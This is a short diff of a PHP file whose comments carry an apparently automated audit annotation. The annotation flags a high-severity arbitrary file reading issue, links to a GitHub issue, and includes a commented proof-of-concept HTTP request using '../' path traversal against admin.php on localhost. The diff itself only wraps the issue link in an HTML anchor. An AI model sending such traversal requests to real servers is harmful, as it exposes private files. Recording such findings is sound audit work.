@@ -1,5 +1,5 @@
 <?php
-//TODO: AI AFR issue #1, High, Arbitrary File Reading, https://github.com/userwithrepo/ACSI_S4/issues/1, 0cd3baa9
+//TODO: AI AFR issue #1, High, Arbitrary File Reading, <a href="https://github.com/userwithrepo/ACSI_S4/issues/1">https://github.com/userwithrepo/ACSI_S4/issues/1</a>, 0cd3baa9
 //AI exploit:
 //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
 //Host: localhost
